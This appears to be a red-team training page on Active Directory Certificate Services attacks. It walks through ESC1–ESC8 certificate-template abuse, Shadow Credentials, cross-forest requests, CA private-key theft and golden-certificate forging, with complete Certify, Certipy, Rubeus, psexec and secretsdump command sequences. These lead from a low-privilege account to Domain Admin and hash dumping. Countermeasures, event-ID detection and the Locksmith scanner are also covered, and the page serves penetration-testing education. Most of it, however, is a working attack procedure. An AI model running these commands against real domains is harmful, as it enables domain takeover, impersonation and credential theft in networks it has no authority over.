---
layout: training-page
title: "ADCS Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - adcs
  - esc1
  - certify
  - certipy
  - pki
page_key: "ad-adcs-attacks"
render_with_liquid: false
---

# ADCS Attacks

## Overview

Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation, deployed in a majority of enterprise AD environments. Misconfigurations in certificate templates allow low-privileged users to request certificates that authenticate as any user — including Domain Admins. SpecterOps researchers documented these as ESC1–ESC13 attack vectors in their 2021 Certified Pre-Owned whitepaper.

ADCS attacks often yield Domain Admin access in a single step from a low-privilege account, making them one of the most impactful AD attack paths when the CA is misconfigured.

![ADCS ESC1 attack: low-priv user enrolls in vulnerable template, CA issues certificate with DA UPN, attacker uses PKINIT to get TGT as Domain Admin](/images/active-directory/adcs-esc1-flow.svg)  
*// adcs esc1 — certificate template abuse to obtain DA TGT*

## ADCS Enumeration

Before exploiting, enumerate the CA configuration and certificate templates to find vulnerable ones. Both Certify (Windows) and Certipy (Linux) perform this enumeration.

```
># Certify (Windows):
# Find all certificate templates:
Certify.exe find

# Find vulnerable templates (misconfigurations):
Certify.exe find /vulnerable

# List available CAs:
Certify.exe cas

# From Linux — Certipy:
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 172.16.5.5
# Outputs JSON + text report of all templates and their misconfigs
# Creates corp.local_BloodHound.zip for BloodHound import

certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 172.16.5.5 -vulnerable -stdout
# -vulnerable: filter to only vulnerable templates
```

## ESC1 — SAN Injection (Most Common)

ESC1 is the most commonly exploited ADCS misconfiguration. It requires three conditions to be met on a template: manager approval is disabled, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set (allows requester to specify the SAN), and enrollment is permitted for low-priv users.

The attack: request a certificate specifying any user (e.g., Domain Admin) in the Subject Alternative Name — the CA issues a cert that authenticates as that user.

```
># ESC1 vulnerable template characteristics:
# - msPKI-Certificate-Name-Flag: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (1)
# - CT_FLAG_NO_SECURITY_EXTENSION not set
# - Enrollment rights for Domain Users or Authenticated Users
# - Client Authentication or Smart Card EKU present

# ── Windows Attack (Certify + Rubeus) ────────────────────────

# Step 1: Find vulnerable ESC1 template:
Certify.exe find /vulnerable
# Look for template with msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT

# Step 2: Request cert with DA SAN:
Certify.exe request /ca:CORP-DC01\corp-CORP-DC01-CA /template:VulnerableTemplate /altname:administrator
# /ca: CA server\CA name
# /template: vulnerable template name
# /altname: target user to impersonate

# Step 3: Convert PEM cert to PFX:
# Copy the -----BEGIN RSA PRIVATE KEY----- + -----BEGIN CERTIFICATE----- blocks to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Enter a PFX password when prompted

# Step 4: Request TGT with the certificate:
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:PFXpassword /ptt
# /ptt: inject ticket into current session

# Step 5: Verify DA access:
klist  # verify ticket
dir \\CORP-DC01\c$
```

## ESC1 — Certipy (Linux Workflow)

```
># Step 1: Find vulnerable template:
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 172.16.5.5 -vulnerable -stdout
# Look for: ESC1 tag in output

# Step 2: Request certificate as DA:
certipy req -u jsmith@corp.local -p 'Password123!' -ca 'corp-CORP-DC01-CA' -template 'VulnerableTemplate' -upn administrator@corp.local -dc-ip 172.16.5.5
# -upn: specify the target UPN for the SAN
# Outputs: administrator.pfx

# Step 3: Use the certificate to get TGT:
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5
# Outputs: administrator.ccache (Kerberos TGT) + NTLM hash

# Step 4: Use the TGT or NTLM hash:
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@CORP-DC01.corp.local

# Or use the NTLM hash directly:
impacket-secretsdump corp.local/administrator@172.16.5.5 -hashes :NTHASH
```

## Other ESC Vulnerabilities (Quick Reference)

```
># ESC2 — Any Purpose EKU + ENROLLEE_SUPPLIES_SUBJECT
# Template has "Any Purpose" or empty EKU — cert can be used for any purpose
# Exploit: same as ESC1 (SAN injection)
Certify.exe request /ca:CORP-DC01\corp-CA /template:ESC2Template /altname:administrator

# ESC3 — Enrollment Agent (Certificate Request Agent)
# Template allows requesting certs ON BEHALF of other users
# Two templates required: one with enrollment agent, one with any client auth
Certify.exe request /ca:CORP-DC01\corp-CA /template:EnrollmentAgentTemplate
Certify.exe request /ca:CORP-DC01\corp-CA /template:UserTemplate /onbehalfof:CORP\administrator /enrollcert:agent.pfx /enrollcertpw:password

# ESC4 — Vulnerable Certificate Template ACL
# Low-priv user can modify template (WriteDacl, WriteOwner, WriteProperty)
# Attacker modifies template to add ENROLLEE_SUPPLIES_SUBJECT → ESC1
# Using Certipy:
certipy template -u jsmith@corp.local -p 'Password123!' -template ESC4Template -save-old
certipy template -u jsmith@corp.local -p 'Password123!' -template ESC4Template -configuration vulnerableconfig.json
# Then exploit as ESC1

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA
# CA-level flag that allows SAN in ANY template request
# No template-level flag needed
certipy req -u jsmith@corp.local -p 'Password123!' -ca 'corp-CA' -template User -upn administrator@corp.local -dc-ip 172.16.5.5

# ESC8 — NTLM Relay to AD CS HTTP Endpoints
# CA web enrollment endpoint (/certsrv/) is vulnerable to NTLM relay
# Relay DC computer account auth to CA to get a cert for the DC
certipy relay -ca 172.16.5.10 -template DomainController
# Combined with Responder or mitm6 to capture DC auth
```

## Certipy Shadow Credentials

Certipy also supports the Shadow Credentials attack — adding a Key Credential to an account's `msDS-KeyCredentialLink` attribute to obtain a TGT as that account via PKINIT.

```
># Shadow Credentials (requires GenericWrite over target account):
certipy shadow auto -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 172.16.5.5
# Adds key credential, requests TGT, removes key credential
# Outputs: targetuser.ccache + NTLM hash

# Manual steps:
certipy shadow add -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 172.16.5.5
certipy auth -pfx targetuser.pfx -dc-ip 172.16.5.5
certipy shadow remove -u jsmith@corp.local -p 'Password123!' -account targetuser -dc-ip 172.16.5.5
```

## Countermeasures

```
># Audit certificate templates for ESC1:
# Templates where CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set + Domain Users can enroll
# Check via: certsrv.msc → Certificate Templates → Properties → Security tab

# Disable web enrollment (if NTLM relay via ESC8 is a concern):
# IIS Manager → certsrv → Authentication → disable Windows Authentication

# Enable HTTPS on CA web enrollment:
# Install SSL cert on the web enrollment endpoint

# Monitor certificate issuance:
# Event ID 4886 (certificate requested) and 4887 (certificate issued)
# Alert on SAN values that don't match the requester

# Remove dangerous EKUs from user-enrollable templates:
# "Any Purpose" (2.5.29.37.0) and "Smart Card Logon" with ENROLLEE_SUPPLIES_SUBJECT = dangerous combo

# Certify audit (run as low-priv user to see what attackers see):
Certify.exe find /vulnerable
```

## ESC1 Attack Walkthrough — Certify + Rubeus

ESC1 is the most common ADCS misconfiguration. A vulnerable template has CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set, no manager approval required, and Domain Users can enroll. This allows any domain user to request a certificate authenticated as any other user (including Domain Admin).

```
># Step 1: Identify vulnerable template with Certify:
.\Certify.exe find /vulnerable
# Key indicators in output:
# msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
# Enrollment Rights includes Domain Users
# pkiextendedkeyusage: Client Authentication

# Step 2: Request certificate as Administrator (SAN injection):
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

# Step 3: Save the output (RSA PRIVATE KEY + CERTIFICATE blocks) to cert.pem
# Fix formatting:
sed -i 's/\s\s\+/\n/g' cert.pem

# Step 4: Convert PEM to PFX:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Step 5: Use Rubeus to get TGT as Administrator:
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

# Step 6: Verify DA access:
dir \\dc1\c$

# Detection: Events 4886 (cert requested) and 4887 (cert issued) on the PKI server
# Event 4768 on DC when certificate is used for TGT authentication
# Get-WinEvent on the PKI server:
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'} | Format-List
```

## ESC7 — Vulnerable CA Access Control (ManageCA / ManageCertificates)

ESC7 applies when a low-privilege user has ManageCA or ManageCertificates rights on the Certificate Authority itself. With ManageCA, the attacker can enable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA — which allows specifying a SAN on any template request, regardless of the template's own settings. This effectively turns any template into ESC1.

```
# Check if user has ManageCA or ManageCertificates on the CA:
# Certify.exe cas — look for principals listed under CA permissions
Certify.exe cas
# or Certipy:
certipy find -u jsmith@corp.local -p 'Password123!' -dc-ip 172.16.5.5 -vulnerable -stdout
# Look for ESC7 tag: "ManageCA" or "ManageCertificates" for non-admin users

# Step 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA via ManageCA rights
# Check current flag value:
certutil -config "CA-SERVER\CA-NAME" -getreg "policy\EditFlags"
# If output includes EDITF_ATTRIBUTESUBJECTALTNAME2 → already vulnerable (also ESC6)

# Using Certipy to abuse ManageCA rights:
certipy ca -u jsmith@corp.local -p 'Password123!' -ca 'corp-CORP-DC01-CA' -enable-template 'User' -dc-ip 172.16.5.5
# or enable the EDITF flag:
certipy ca -u jsmith@corp.local -p 'Password123!' -ca 'corp-CORP-DC01-CA' -enable-userspecified-san -dc-ip 172.16.5.5

# Step 2: After enabling the flag, request a cert with SAN from any template
certipy req -u jsmith@corp.local -p 'Password123!' -ca 'corp-CORP-DC01-CA' -template User -upn administrator@corp.local -dc-ip 172.16.5.5

# Step 3: Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5

# Manual flag set via registry (if you have write access to the CA registry):
certutil -config "CA-SERVER\CA-NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
# Restart CertSvc for the change to take effect:
Restart-Service CertSvc

# Detection: Monitor Event ID 4662 (CA object modification) and CA audit logs
# Disable EDITF_ATTRIBUTESUBJECTALTNAME2 to remediate:
certutil -config "CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc
```

## AD CS Cross-Trust Attacks

When an enterprise CA is accessible across a forest trust, certificate attacks can be used to compromise accounts in the foreign forest. If a vulnerable template exists in a trusted forest's CA and allows low-privilege enrollment, cross-forest certificate attacks become possible.

```
# Enumerate CAs accessible from a trusted domain:
# From a host in the trusted domain, Certify/Certipy can reach the CA if network access exists
Certify.exe find /vulnerable
# Look for templates in CAs belonging to another domain/forest

# Request cross-forest certificate:
Certify.exe request /ca:foreignca.partner.local\partner-CA /template:VulnerableTemplate /altname:administrator@partner.local

# Convert and use certificate to get TGT in partner forest:
Rubeus.exe asktgt /user:administrator /domain:partner.local /certificate:cert.pfx /password:pass /ptt

# From Linux — cross-forest ADCS request:
certipy req -u jsmith@corp.local -p 'Password123!' -ca 'partner-CA' -template VulnerableTemplate -upn administrator@partner.local -dc-ip PARTNER_DC_IP

# Golden certificate — forge certificate directly from CA private key (if CA is compromised):
# Steal CA private key:
certipy ca -backup -u administrator@corp.local -p 'Password123!' -ca 'corp-CA' -dc-ip 172.16.5.5
# Forge certificate for any user using stolen CA key:
certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator'
# Use forged certificate:
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.5.5
```

## Locksmith — AD CS Misconfiguration Scanner

Locksmith is a PowerShell tool that finds and optionally remediates common AD CS misconfigurations. It must run on a domain-joined machine and can scan for ESC1–ESC16 vulnerabilities. Use it both offensively (find exploitable templates) and defensively (remediate issues).

```
# Install from PowerShell Gallery:
Install-Module -Name Locksmith -Scope CurrentUser

# Import the module:
Import-Module Locksmith

# Mode 0 — Identify issues, output to console (default — offensive use):
Invoke-Locksmith
Invoke-Locksmith -Mode 0

# Mode 1 — Issues + remediation steps, console output:
Invoke-Locksmith -Mode 1

# Mode 2 — Issues only, export to ADCSIssues.CSV:
Invoke-Locksmith -Mode 2

# Mode 3 — Issues + fixes, export to ADCSRemediation.CSV:
Invoke-Locksmith -Mode 3

# Mode 4 — Interactive fix-all (offers to remediate each issue):
Invoke-Locksmith -Mode 4

# Scan for specific ESC vulnerabilities:
Invoke-Locksmith -Scans ESC1          # ESC1 only
Invoke-Locksmith -Scans ESC1,ESC2,ESC8  # multiple
Invoke-Locksmith -Scans All           # all checks
Invoke-Locksmith -Scans PromptMe      # interactive selection menu

# Supported scan types:
# ESC1  — enrollee supplies subject (SAN spoofing)
# ESC2  — Any Purpose EKU or no EKU (template abuse)
# ESC3  — Certificate Request Agent (enrollment agent abuse)
# ESC4  — vulnerable template ACL (write access to template)
# ESC5  — vulnerable PKI object ACL (write to CA, NTAuthCertificates)
# ESC6  — EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA
# ESC7  — vulnerable CA ACL (manage CA / issue and manage certs)
# ESC8  — NTLM relay to AD CS HTTP endpoint
# ESC9  — no security extension in certificate
# ESC11 — IF_ENFORCEENCRYPTICERTREQUEST disabled
# ESC13 — OID group link abuse
# ESC15 — schema version 1 template with SAN (EKEUwu variant)
# ESC16 — security extension disabled at CA level

# Quick offensive scan (find exploitable templates):
Invoke-Locksmith -Scans ESC1,ESC3,ESC6,ESC8 -Mode 0
```

## Resources

- Certipy — `github.com/ly4k/Certipy`
- Certify — `github.com/GhostPack/Certify`
- Locksmith — `github.com/jakehildreth/Locksmith`
- SpecterOps — Certified Pre-Owned whitepaper — `specterops.io/assets/resources/Certified_Pre-Owned.pdf`
- MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates — `attack.mitre.org/techniques/T1649/`
- AD CS attack matrix — `github.com/ly4k/Certipy/wiki`
